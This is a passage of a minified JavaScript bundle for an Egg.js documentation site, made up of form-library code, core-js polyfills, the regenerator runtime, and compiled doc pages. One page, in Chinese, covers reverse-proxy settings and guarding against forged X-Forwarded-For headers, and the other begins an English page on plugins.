t=e.rule.warningOnly,r=e.errors;t?a.push.apply(a,Object(c["a"])(r)):n.push.apply(n,Object(c["a"])(r))})),n.length?Promise.reject({name:u,errors:n,warnings:a}):{name:u,errors:n,warnings:a}})))}}}));var o=he(l);n.lastValidatePromise=o,o["catch"]((function(e){return e})).then((function(e){var t=e.map((function(e){var t=e.name;return t}));n.notifyObservers(n.store,t,{type:"validateFinish"}),n.triggerOnFieldsChange(t,e)}));var s=o.then((function(){return n.lastValidatePromise===o?Promise.resolve(n.getFieldsValue(r)):Promise.reject([])}))["catch"]((function(e){var t=e.filter((function(e){return e&&e.errors.length}));return Promise.reject({values:n.getFieldsValue(r),errorFields:t,outOfDate:n.lastValidatePromise!==o})}));return s["catch"]((function(e){return e})),s},this.submit=function(){n.warningUnhooked(),n.validateFields().then((function(e){var t=n.callbacks.onFinish;if(t)try{t(e)}catch(a){console.error(a)}}))["catch"]((function(e){var t=n.callbacks.onFinishFailed;t&&t(e)}))},this.forceRootUpdate=t}));function ke(e){var t=a["useRef"](),n=a["useState"]({}),r=Object(pe["a"])(n,2),l=r[1];if(!t.current)if(e)t.current=e;else{var o=function(){l({})},i=new ye(o);t.current=i.getForm()}return[t.current]}var we=ke,xe=a["createContext"]({triggerFormChange:function(){},triggerFormFinish:function(){},registerForm:function(){},unregisterForm:function(){}}),je=function(e){var t=e.validateMessages,n=e.onFormChange,r=e.onFormFinish,l=e.children,c=a["useContext"](xe),s=a["useRef"]({});return a["createElement"](xe.Provider,{value:Object(i["a"])(Object(i["a"])({},c),{},{validateMessages:Object(i["a"])(Object(i["a"])({},c.validateMessages),t),triggerFormChange:function(e,t){n&&n(e,{changedFields:t,forms:s.current}),c.triggerFormChange(e,t)},triggerFormFinish:function(e,t){r&&r(e,{values:t,forms:s.current}),c.triggerFormFinish(e,t)},registerForm:function(e,t){e&&(s.current=Object(i["a"])(Object(i["a"])({},s.current),{},Object(o["a"])({},e,t))),c.registerForm(e,t)},unregisterForm:function(e){var t=Object(i["a"])({},s.current);delete t[e],s.current=t,c.unregisterForm(e)}})},l)},Se=xe,Ce=["name","initialValues","fields","form","preserve","children","component","validateMessages","validateTrigger","onValuesChange","onFieldsChange","onFinish","onFinishFailed"],Ae=function(e,t){var n=e.name,o=e.initialValues,c=e.fields,s=e.form,u=e.preserve,d=e.children,m=e.component,p=void 0===m?"form":m,h=e.validateMessages,g=e.validateTrigger,E=void 0===g?"onChange":g,b=e.onValuesChange,y=e.onFieldsChange,k=e.onFinish,w=e.onFinishFailed,x=Object(l["a"])(e,Ce),j=a["useContext"](Se),S=we(s),C=Object(pe["a"])(S,1),A=C[0],L=A.getInternalHooks(f),T=L.useSubscribe,N=L.setInitialValues,O=L.setCallbacks,I=L.setValidateMessages,P=L.setPreserve,R=L.destroyForm;a["useImperativeHandle"](t,(function(){return A})),a["useEffect"]((function(){return j.registerForm(n,A),function(){j.unregisterForm(n)}}),[j,A,n]),I(Object(i["a"])(Object(i["a"])({},j.validateMessages),h)),O({onValuesChange:b,onFieldsChange:function(e){if(j.triggerFormChange(n,e),y){for(var t=arguments.length,a=new Array(t>1?t-1:0),r=1;r<t;r++)a[r-1]=arguments[r];y.apply(void 0,[e].concat(a))}},onFinish:function(e){j.triggerFormFinish(n,e),k&&k(e)},onFinishFailed:w}),P(u);var _,q=a["useRef"](null);N(o,!q.current),q.current||(q.current=!0),a["useEffect"]((function(){return R}),[]);var M="function"===typeof d;if(M){var F=A.getFieldsValue(!0);_=d(F,A)}else _=d;T(!M);var D=a["useRef"]();a["useEffect"]((function(){W(D.current||[],c||[])||A.setFields(c||[]),D.current=c}),[c,A]);var U=a["useMemo"]((function(){return Object(i["a"])(Object(i["a"])({},A),{},{validateTrigger:E})}),[A,E]),z=a["createElement"](v.Provider,{value:U},_);return!1===p?z:a["createElement"](p,Object(r["a"])({},x,{onSubmit:function(e){e.preventDefault(),e.stopPropagation(),A.submit()},onReset:function(e){var t;e.preventDefault(),A.resetFields(),null===(t=x.onReset)||void 0===t||t.call(x,e)}}),z)},Le=Ae;function Te(e){try{return JSON.stringify(e)}catch(t){return Math.random()}}var Ne=function(){};function Oe(){for(var e=arguments.length,t=new Array(e),n=0;n<e;n++)t[n]=arguments[n];var r=t[0],l=void 0===r?[]:r,o=t[1],i=Object(a["useState"])(),c=Object(pe["a"])(i,2),s=c[0],u=c[1],d=Object(a["useMemo"])((function(){return Te(s)}),[s]),m=Object(a["useRef"])(d);m.current=d;var p=Object(a["useContext"])(v),h=o||p,g=h&&h._init;var E=_(l),b=Object(a["useRef"])(E);return b.current=E,Ne(E),Object(a["useEffect"])((function(){if(g){var e=h.getFieldsValue,t=h.getInternalHooks,n=t(f),a=n.registerWatch,r=a((function(e){var t=q(e,b.current),n=Te(t);m.current!==n&&(m.current=n,u(t))})),l=q(e(),b.current);return u(l),r}}),[g]),s}var Ie=Oe,Pe=a["forwardRef"](Le),Re=Pe;Re.FormProvider=je,Re.Field=ce,Re.List=me,Re.useForm=we,Re.useWatch=Ie},u9el:function(e,t,n){"use strict";var a=n("0mt+"),r=n("A0UU"),l=n("9Rcy"),o=n("MPZC"),i=n("MAgz"),c=n("Dx5A"),s=n("k8mt"),u=n("aGbw"),d=n("XExY"),m=n("N0Us"),p=n("vGeg"),h=n("uYj3"),g=n("PE5i"),f=n("31yA"),E=n("+0HW"),b=n("a7jj"),v=n("tbdv"),y=n("4bQT"),k=n("TVTq").f,w=n("KaNj"),x=n("x5+g").forEach,j=n("tPcN"),S=n("u3TI"),C=n("vr25"),A=n("lz/I"),L=n("Fndp"),T=A.get,N=A.set,O=S.f,I=C.f,P=Math.round,R=r.RangeError,_=c.ArrayBuffer,q=c.DataView,M=i.NATIVE_ARRAY_BUFFER_VIEWS,F=i.TYPED_ARRAY_TAG,D=i.TypedArray,U=i.TypedArrayPrototype,z=i.aTypedArrayConstructor,H=i.isTypedArray,B="BYTES_PER_ELEMENT",W="Wrong length",V=function(e,t){var n=0,a=t.length,r=new(z(e))(a);while(a>n)r[n]=t[n++];return r},$=function(e,t){O(e,t,{get:function(){return T(this)[t]}})},G=function(e){var t;return e instanceof _||"ArrayBuffer"==(t=E(e))||"SharedArrayBuffer"==t},X=function(e,t){return H(e)&&"symbol"!=typeof t&&t in e&&String(+t)==String(t)},Q=function(e,t){return X(e,t=g(t,!0))?u(2,e[t]):I(e,t)},K=function(e,t,n){return!(X(e,t=g(t,!0))&&b(n)&&f(n,"value"))||f(n,"get")||f(n,"set")||n.configurable||f(n,"writable")&&!n.writable||f(n,"enumerable")&&!n.enumerable?O(e,t,n):(e[t]=n.value,e)};l?(M||(C.f=Q,S.f=K,$(U,"buffer"),$(U,"byteOffset"),$(U,"byteLength"),$(U,"length")),a({target:"Object",stat:!0,forced:!M},{getOwnPropertyDescriptor:Q,defineProperty:K}),e.exports=function(e,t,n){var l=e.match(/\d+$/)[0]/8,i=e+(n?"Clamped":"")+"Array",c="get"+e,u="set"+e,g=r[i],f=g,E=f&&f.prototype,S={},C=function(e,t){var n=T(e);return n.view[c](t*l+n.byteOffset,!0)},A=function(e,t,a){var r=T(e);n&&(a=(a=P(a))<0?0:a>255?255:255&a),r.view[u](t*l+r.byteOffset,a,!0)},I=function(e,t){O(e,t,{get:function(){return C(this,t)},set:function(e){return A(this,t,e)},enumerable:!0})};M?o&&(f=t((function(e,t,n,a){return s(e,f,i),L(function(){return b(t)?G(t)?void 0!==a?new g(t,h(n,l),a):void 0!==n?new g(t,h(n,l)):new g(t):H(t)?V(f,t):w.call(f,t):new g(p(t))}(),e,f)})),y&&y(f,D),x(k(g),(function(e){e in f||d(f,e,g[e])})),f.prototype=E):(f=t((function(e,t,n,a){s(e,f,i);var r,o,c,u=0,d=0;if(b(t)){if(!G(t))return H(t)?V(f,t):w.call(f,t);r=t,d=h(n,l);var g=t.byteLength;if(void 0===a){if(g%l)throw R(W);if(o=g-d,o<0)throw R(W)}else if(o=m(a)*l,o+d>g)throw R(W);c=o/l}else c=p(t),o=c*l,r=new _(o);N(e,{buffer:r,byteOffset:d,byteLength:o,length:c,view:new q(r)});while(u<c)I(e,u++)})),y&&y(f,D),E=f.prototype=v(U)),E.constructor!==f&&d(E,"constructor",f),F&&d(E,F,i),S[i]=f,a({global:!0,forced:f!=g,sham:!M},S),B in f||d(f,B,l),B in E||d(E,B,l),j(i)}):e.exports=function(){}},uDzu:function(e,t,n){"use strict";var a=n("0mt+"),r=n("7Vsj").start,l=n("4BFV"),o=l("trimStart"),i=o?function(){return r(this)}:"".trimStart;a({target:"String",proto:!0,forced:o},{trimStart:i,trimLeft:i})},"uMX+":function(e,t,n){"use strict";var a=n("P0Lz"),r=n("x9/w").getWeakData,l=n("oyD1"),o=n("a7jj"),i=n("k8mt"),c=n("NBU9"),s=n("x5+g"),u=n("31yA"),d=n("lz/I"),m=d.set,p=d.getterFor,h=s.find,g=s.findIndex,f=0,E=function(e){return e.frozen||(e.frozen=new b)},b=function(){this.entries=[]},v=function(e,t){return h(e.entries,(function(e){return e[0]===t}))};b.prototype={get:function(e){var t=v(this,e);if(t)return t[1]},has:function(e){return!!v(this,e)},set:function(e,t){var n=v(this,e);n?n[1]=t:this.entries.push([e,t])},delete:function(e){var t=g(this.entries,(function(t){return t[0]===e}));return~t&&this.entries.splice(t,1),!!~t}},e.exports={getConstructor:function(e,t,n,s){var d=e((function(e,a){i(e,d,t),m(e,{type:t,id:f++,frozen:void 0}),void 0!=a&&c(a,e[s],e,n)})),h=p(t),g=function(e,t,n){var a=h(e),o=r(l(t),!0);return!0===o?E(a).set(t,n):o[a.id]=n,e};return a(d.prototype,{delete:function(e){var t=h(this);if(!o(e))return!1;var n=r(e);return!0===n?E(t)["delete"](e):n&&u(n,t.id)&&delete n[t.id]},has:function(e){var t=h(this);if(!o(e))return!1;var n=r(e);return!0===n?E(t).has(e):n&&u(n,t.id)}}),a(d.prototype,n?{get:function(e){var t=h(this);if(o(e)){var n=r(e);return!0===n?E(t).get(e):n?n[t.id]:void 0}},set:function(e,t){return g(this,e,t)}}:{add:function(e){return g(this,e,!0)}}),d}}},uYj3:function(e,t,n){var a=n("/+3C");e.exports=function(e,t){var n=a(e);if(n%t)throw RangeError("Wrong offset");return n}},uaw7:function(e,t){function n(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}e.exports=n,e.exports.__esModule=!0,e.exports["default"]=e.exports},ulzO:function(e,t,n){"use strict";n.d(t,"a",(function(){return l}));var a=n("FU0I"),r=a["createContext"](!1),l=function(e){var t=e.children,n=e.disabled,l=a["useContext"](r);return a["createElement"](r.Provider,{value:null!==n&&void 0!==n?n:l},t)};t["b"]=r},uoOj:function(e,t,n){"use strict";var a=n("0mt+"),r=n("NBU9"),l=n("XaNN");a({target:"Map",stat:!0},{keyBy:function(e,t){var n=new this;l(t);var a=l(n.set);return r(e,(function(e){a.call(n,t(e),e)})),n}})},upI0:function(e,t,n){var a=n("glQ/")["default"];function r(){"use strict";e.exports=r=function(){return t},e.exports.__esModule=!0,e.exports["default"]=e.exports;var t={},n=Object.prototype,l=n.hasOwnProperty,o="function"==typeof Symbol?Symbol:{},i=o.iterator||"@@iterator",c=o.asyncIterator||"@@asyncIterator",s=o.toStringTag||"@@toStringTag";function u(e,t,n){return Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}),e[t]}try{u({},"")}catch(T){u=function(e,t,n){return e[t]=n}}function d(e,t,n,a){var r=t&&t.prototype instanceof h?t:h,l=Object.create(r.prototype),o=new C(a||[]);return l._invoke=function(e,t,n){var a="suspendedStart";return function(r,l){if("executing"===a)throw new Error("Generator is already running");if("completed"===a){if("throw"===r)throw l;return L()}for(n.method=r,n.arg=l;;){var o=n.delegate;if(o){var i=x(o,n);if(i){if(i===p)continue;return i}}if("next"===n.method)n.sent=n._sent=n.arg;else if("throw"===n.method){if("suspendedStart"===a)throw a="completed",n.arg;n.dispatchException(n.arg)}else"return"===n.method&&n.abrupt("return",n.arg);a="executing";var c=m(e,t,n);if("normal"===c.type){if(a=n.done?"completed":"suspendedYield",c.arg===p)continue;return{value:c.arg,done:n.done}}"throw"===c.type&&(a="completed",n.method="throw",n.arg=c.arg)}}}(e,n,o),l}function m(e,t,n){try{return{type:"normal",arg:e.call(t,n)}}catch(T){return{type:"throw",arg:T}}}t.wrap=d;var p={};function h(){}function g(){}function f(){}var E={};u(E,i,(function(){return this}));var b=Object.getPrototypeOf,v=b&&b(b(A([])));v&&v!==n&&l.call(v,i)&&(E=v);var y=f.prototype=h.prototype=Object.create(E);function k(e){["next","throw","return"].forEach((function(t){u(e,t,(function(e){return this._invoke(t,e)}))}))}function w(e,t){function n(r,o,i,c){var s=m(e[r],e,o);if("throw"!==s.type){var u=s.arg,d=u.value;return d&&"object"==a(d)&&l.call(d,"__await")?t.resolve(d.__await).then((function(e){n("next",e,i,c)}),(function(e){n("throw",e,i,c)})):t.resolve(d).then((function(e){u.value=e,i(u)}),(function(e){return n("throw",e,i,c)}))}c(s.arg)}var r;this._invoke=function(e,a){function l(){return new t((function(t,r){n(e,a,t,r)}))}return r=r?r.then(l,l):l()}}function x(e,t){var n=e.iterator[t.method];if(void 0===n){if(t.delegate=null,"throw"===t.method){if(e.iterator["return"]&&(t.method="return",t.arg=void 0,x(e,t),"throw"===t.method))return p;t.method="throw",t.arg=new TypeError("The iterator does not provide a 'throw' method")}return p}var a=m(n,e.iterator,t.arg);if("throw"===a.type)return t.method="throw",t.arg=a.arg,t.delegate=null,p;var r=a.arg;return r?r.done?(t[e.resultName]=r.value,t.next=e.nextLoc,"return"!==t.method&&(t.method="next",t.arg=void 0),t.delegate=null,p):r:(t.method="throw",t.arg=new TypeError("iterator result is not an object"),t.delegate=null,p)}function j(e){var t={tryLoc:e[0]};1 in e&&(t.catchLoc=e[1]),2 in e&&(t.finallyLoc=e[2],t.afterLoc=e[3]),this.tryEntries.push(t)}function S(e){var t=e.completion||{};t.type="normal",delete t.arg,e.completion=t}function C(e){this.tryEntries=[{tryLoc:"root"}],e.forEach(j,this),this.reset(!0)}function A(e){if(e){var t=e[i];if(t)return t.call(e);if("function"==typeof e.next)return e;if(!isNaN(e.length)){var n=-1,a=function t(){for(;++n<e.length;)if(l.call(e,n))return t.value=e[n],t.done=!1,t;return t.value=void 0,t.done=!0,t};return a.next=a}}return{next:L}}function L(){return{value:void 0,done:!0}}return g.prototype=f,u(y,"constructor",f),u(f,"constructor",g),g.displayName=u(f,s,"GeneratorFunction"),t.isGeneratorFunction=function(e){var t="function"==typeof e&&e.constructor;return!!t&&(t===g||"GeneratorFunction"===(t.displayName||t.name))},t.mark=function(e){return Object.setPrototypeOf?Object.setPrototypeOf(e,f):(e.__proto__=f,u(e,s,"GeneratorFunction")),e.prototype=Object.create(y),e},t.awrap=function(e){return{__await:e}},k(w.prototype),u(w.prototype,c,(function(){return this})),t.AsyncIterator=w,t.async=function(e,n,a,r,l){void 0===l&&(l=Promise);var o=new w(d(e,n,a,r),l);return t.isGeneratorFunction(n)?o:o.next().then((function(e){return e.done?e.value:o.next()}))},k(y),u(y,s,"Generator"),u(y,i,(function(){return this})),u(y,"toString",(function(){return"[object Generator]"})),t.keys=function(e){var t=[];for(var n in e)t.push(n);return t.reverse(),function n(){for(;t.length;){var a=t.pop();if(a in e)return n.value=a,n.done=!1,n}return n.done=!0,n}},t.values=A,C.prototype={constructor:C,reset:function(e){if(this.prev=0,this.next=0,this.sent=this._sent=void 0,this.done=!1,this.delegate=null,this.method="next",this.arg=void 0,this.tryEntries.forEach(S),!e)for(var t in this)"t"===t.charAt(0)&&l.call(this,t)&&!isNaN(+t.slice(1))&&(this[t]=void 0)},stop:function(){this.done=!0;var e=this.tryEntries[0].completion;if("throw"===e.type)throw e.arg;return this.rval},dispatchException:function(e){if(this.done)throw e;var t=this;function n(n,a){return o.type="throw",o.arg=e,t.next=n,a&&(t.method="next",t.arg=void 0),!!a}for(var a=this.tryEntries.length-1;a>=0;--a){var r=this.tryEntries[a],o=r.completion;if("root"===r.tryLoc)return n("end");if(r.tryLoc<=this.prev){var i=l.call(r,"catchLoc"),c=l.call(r,"finallyLoc");if(i&&c){if(this.prev<r.catchLoc)return n(r.catchLoc,!0);if(this.prev<r.finallyLoc)return n(r.finallyLoc)}else if(i){if(this.prev<r.catchLoc)return n(r.catchLoc,!0)}else{if(!c)throw new Error("try statement without catch or finally");if(this.prev<r.finallyLoc)return n(r.finallyLoc)}}}},abrupt:function(e,t){for(var n=this.tryEntries.length-1;n>=0;--n){var a=this.tryEntries[n];if(a.tryLoc<=this.prev&&l.call(a,"finallyLoc")&&this.prev<a.finallyLoc){var r=a;break}}r&&("break"===e||"continue"===e)&&r.tryLoc<=t&&t<=r.finallyLoc&&(r=null);var o=r?r.completion:{};return o.type=e,o.arg=t,r?(this.method="next",this.next=r.finallyLoc,p):this.complete(o)},complete:function(e,t){if("throw"===e.type)throw e.arg;return"break"===e.type||"continue"===e.type?this.next=e.arg:"return"===e.type?(this.rval=this.arg=e.arg,this.method="return",this.next="end"):"normal"===e.type&&t&&(this.next=t),p},finish:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.finallyLoc===e)return this.complete(n.completion,n.afterLoc),S(n),p}},catch:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.tryLoc===e){var a=n.completion;if("throw"===a.type){var r=a.arg;S(n)}return r}}throw new Error("illegal catch attempt")},delegateYield:function(e,t,n){return this.delegate={iterator:A(e),resultName:t,nextLoc:n},"next"===this.method&&(this.arg=void 0),p}},t}e.exports=r,e.exports.__esModule=!0,e.exports["default"]=e.exports},upeu:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u7684\u670d\u52a1\u90fd\u4e0d\u4f1a\u76f4\u63a5\u63a5\u53d7\u5916\u90e8\u7684\u8bf7\u6c42\uff0c\u800c\u4f1a\u5c06\u670d\u52a1\u90e8\u7f72\u5728\u63a5\u5165\u5c42\u4e4b\u540e\uff0c\u4ece\u800c\u5b9e\u73b0\u591a\u53f0\u673a\u5668\u7684\u8d1f\u8f7d\u5747\u8861\u548c\u670d\u52a1\u7684\u5e73\u6ed1\u53d1\u5e03\uff0c\u4fdd\u8bc1\u9ad8\u53ef\u7528\u3002"),r.a.createElement("p",null,"\u5728\u8fd9\u4e2a\u573a\u666f\u4e0b\uff0c\u6211\u4eec\u65e0\u6cd5\u76f4\u63a5\u83b7\u53d6\u5230\u771f\u5b9e\u7528\u6237\u8bf7\u6c42\u7684\u8fde\u63a5\uff0c\u4ece\u800c\u65e0\u6cd5\u786e\u8ba4\u7528\u6237\u7684\u771f\u5b9e IP\uff0c\u8bf7\u6c42\u534f\u8bae\uff0c\u751a\u81f3\u8bf7\u6c42\u7684\u57df\u540d\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6846\u67b6\u9ed8\u8ba4\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u914d\u7f6e\u9879\u6765\u8ba9\u5f00\u53d1\u8005\u914d\u7f6e\uff0c\u4ee5\u4fbf\u57fa\u4e8e\u548c\u63a5\u5165\u5c42\u7684\u7ea6\u5b9a\uff08\u4e8b\u5b9e\u6807\u51c6\uff09\u6765\u8ba9\u5e94\u7528\u5c42\u83b7\u53d6\u5230\u771f\u5b9e\u7684\u7528\u6237\u8bf7\u6c42\u4fe1\u606f\u3002"),r.a.createElement("h2",{id:"\u5f00\u542f\u524d\u7f6e\u4ee3\u7406\u6a21\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u5f00\u542f\u524d\u7f6e\u4ee3\u7406\u6a21\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5f00\u542f\u524d\u7f6e\u4ee3\u7406\u6a21\u5f0f"),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"config.proxy = true"),"\uff0c\u53ef\u4ee5\u6253\u5f00\u524d\u7f6e\u4ee3\u7406\u6a21\u5f0f\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\n\nexports.proxy = true;",lang:"js"}),r.a.createElement("p",null,"\u6ce8\u610f\uff0c\u5f00\u542f\u6b64\u6a21\u5f0f\u540e\uff0c\u5e94\u7528\u5c31\u9ed8\u8ba4\u81ea\u5df1\u5904\u4e8e\u53cd\u5411\u4ee3\u7406\u4e4b\u540e\uff0c\u4f1a\u652f\u6301\u901a\u8fc7\u89e3\u6790\u7ea6\u5b9a\u7684\u8bf7\u6c42\u5934\u6765\u83b7\u53d6\u7528\u6237\u771f\u5b9e\u7684 IP\uff0c\u534f\u8bae\u548c\u57df\u540d\u3002\u5982\u679c\u4f60\u7684\u670d\u52a1\u672a\u90e8\u7f72\u5728\u53cd\u5411\u4ee3\u7406\u4e4b\u540e\uff0c\u8bf7\u4e0d\u8981\u5f00\u542f\u6b64\u914d\u7f6e\uff0c\u4ee5\u9632\u88ab\u6076\u610f\u7528\u6237\u4f2a\u9020\u8bf7\u6c42 IP \u7b49\u4fe1\u606f\u3002"),r.a.createElement("h3",{id:"configipheaders"},r.a.createElement(l["AnchorLink"],{to:"#configipheaders","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"config.ipHeaders")),r.a.createElement("p",null,"\u5f00\u542f proxy \u914d\u7f6e\u540e\uff0c\u5e94\u7528\u4f1a\u89e3\u6790 ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/X-Forwarded-For"},"X-Forwarded-For")," \u8bf7\u6c42\u5934\u6765\u83b7\u53d6\u5ba2\u6237\u7aef\u7684\u771f\u5b9e IP\u3002\u5982\u679c\u4f60\u7684\u524d\u7f6e\u4ee3\u7406\u901a\u8fc7\u5176\u4ed6\u7684\u8bf7\u6c42\u5934\u6765\u4f20\u9012\u8be5\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"config.ipHeaders")," \u6765\u914d\u7f6e\uff0c\u8fd9\u4e2a\u914d\u7f6e\u9879\u652f\u6301\u914d\u7f6e\u591a\u4e2a\u5934\uff08\u9017\u53f7\u5206\u5f00\uff09\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\n\nexports.ipHeaders = 'X-Real-Ip, X-Forwarded-For';",lang:"js"}),r.a.createElement("h3",{id:"configmaxipscount"},r.a.createElement(l["AnchorLink"],{to:"#configmaxipscount","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"config.maxIpsCount")),r.a.createElement("p",null,r.a.createElement("code",null,"X-Forwarded-For")," \u7b49\u4f20\u9012 IP \u7684\u5934\uff0c\u901a\u7528\u7684\u683c\u5f0f\u662f\uff1a"),r.a.createElement(o["a"],{code:"X-Forwarded-For: client, proxy1, proxy2",lang:"unknown"}),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u62ff\u7b2c\u4e00\u4e2a\u4f5c\u4e3a\u8bf7\u6c42\u7684\u771f\u5b9e IP\uff0c\u4f46\u662f\u5982\u679c\u6709\u6076\u610f\u7528\u6237\u5728\u8bf7\u6c42\u4e2d\u4f20\u9012\u4e86 ",r.a.createElement("code",null,"X-Forwarded-For")," \u53c2\u6570\u6765\u4f2a\u9020\u5176\u5728\u53cd\u5411\u4ee3\u7406\u4e4b\u540e\uff0c\u5c31\u4f1a\u5bfc\u81f4 ",r.a.createElement("code",null,"X-Forwarded-For")," \u62ff\u5230\u7684\u503c\u4e0d\u51c6\u786e\u4e86\uff0c\u53ef\u4ee5\u88ab\u7528\u6765\u4f2a\u9020\u8bf7\u6c42 IP \u5730\u5740\uff0c\u7a81\u7834\u5e94\u7528\u5c42\u7684\u4e00\u4e9b IP \u9650\u5236\u3002"),r.a.createElement(o["a"],{code:"X-Forwarded-For: fake, client, proxy1, proxy2",lang:"unknown"}),r.a.createElement("p",null,"\u4e3a\u4e86\u907f\u514d\u6b64\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"config.maxIpsCount")," \u6765\u914d\u7f6e\u524d\u7f6e\u7684\u53cd\u5411\u4ee3\u7406\u6570\u91cf\uff0c\u8fd9\u6837\u5728\u83b7\u53d6\u8bf7\u6c42\u771f\u5b9e IP \u5730\u5740\u65f6\uff0c\u5c31\u4f1a\u5ffd\u7565\u6389\u7528\u6237\u591a\u4f20\u9012\u7684\u4f2a\u9020 IP \u5730\u5740\u4e86\u3002\u4f8b\u5982\u6211\u4eec\u5c06\u5e94\u7528\u90e8\u7f72\u5728\u4e00\u4e2a\u7edf\u4e00\u7684\u63a5\u5165\u5c42\u4e4b\u540e\uff08\u4f8b\u5982\u963f\u91cc\u4e91 SLB\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u6b64\u53c2\u6570\u914d\u7f6e\u4e3a ",r.a.createElement("code",null,"1"),"\uff0c\u8fd9\u6837\u7528\u6237\u5c31\u65e0\u6cd5\u901a\u8fc7 ",r.a.createElement("code",null,"X-Forwarded-For")," \u8bf7\u6c42\u5934\u6765\u4f2a\u9020 IP \u5730\u5740\u4e86\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\n\nexports.maxIpsCount = 1;",lang:"js"}),r.a.createElement("p",null,"\u6b64\u914d\u7f6e\u9879\u4e0e ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/koa/blob/master/docs/api/request.md#requestips"},"koa")," \u63d0\u4f9b\u7684 ",r.a.createElement("code",null,"options.maxIpsCount")," \u4f5c\u7528\u4e00\u81f4\u3002"),r.a.createElement("h3",{id:"configprotocolheaders"},r.a.createElement(l["AnchorLink"],{to:"#configprotocolheaders","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"config.protocolHeaders")),r.a.createElement("p",null,"\u5f00\u542f proxy \u914d\u7f6e\u540e\uff0c\u5e94\u7528\u4f1a\u89e3\u6790 ",r.a.createElement(l["Link"],{to:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Proto"},"X-Forwarded-Proto")," \u8bf7\u6c42\u5934\u6765\u83b7\u53d6\u5ba2\u6237\u7aef\u7684\u771f\u5b9e\u8bbf\u95ee\u534f\u8bae\u3002\u5982\u679c\u4f60\u7684\u524d\u7f6e\u4ee3\u7406\u901a\u8fc7\u5176\u4ed6\u7684\u8bf7\u6c42\u5934\u6765\u4f20\u9012\u8be5\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"config.protocolHeaders")," \u6765\u914d\u7f6e\uff0c\u8fd9\u4e2a\u914d\u7f6e\u9879\u652f\u6301\u914d\u7f6e\u591a\u4e2a\u5934\uff08\u9017\u53f7\u5206\u5f00\uff09\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\n\nexports.protocolHeaders = 'X-Real-Proto, X-Forwarded-Proto';",lang:"js"}),r.a.createElement("h3",{id:"confighostheaders"},r.a.createElement(l["AnchorLink"],{to:"#confighostheaders","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"config.hostHeaders")),r.a.createElement("p",null,"\u5f00\u542f proxy \u914d\u7f6e\u540e\uff0c\u5e94\u7528\u4ecd\u7136\u8fd8\u662f\u76f4\u63a5\u8bfb\u53d6 ",r.a.createElement("code",null,"host")," \u6765\u83b7\u53d6\u8bf7\u6c42\u7684\u57df\u540d\uff0c\u7edd\u5927\u90e8\u5206\u53cd\u5411\u4ee3\u7406\u5e76\u4e0d\u4f1a\u4fee\u6539\u8fd9\u4e2a\u503c\u3002\u4f46\u662f\u4e5f\u8bb8\u6709\u4e9b\u53cd\u5411\u4ee3\u7406\u4f1a\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host"},"X-Forwarded-Host")," \u6765\u4f20\u9012\u5ba2\u6237\u7aef\u7684\u771f\u5b9e\u8bbf\u95ee\u57df\u540d\uff0c\u53ef\u4ee5\u901a\u8fc7\u5728 ",r.a.createElement("code",null,"config.hostHeaders")," \u4e2d\u914d\u7f6e\uff0c\u8fd9\u4e2a\u914d\u7f6e\u9879\u652f\u6301\u914d\u7f6e\u591a\u4e2a\u5934\uff08\u9017\u53f7\u5206\u5f00\uff09\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\n\nexports.hostHeaders = 'X-Forwarded-Host';",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"v+xt":function(e,t,n){},v5kC:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Plugins are the most important features in Egg framework. They keep Egg simple, stable and efficient, and also they make the best reuse of business logic to build an entire ecosystem. Maybe we want to ask:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Since Koa already has the mechanism of middleware, Why do we need plugins?"),r.a.createElement("li",null,"What are the differences / 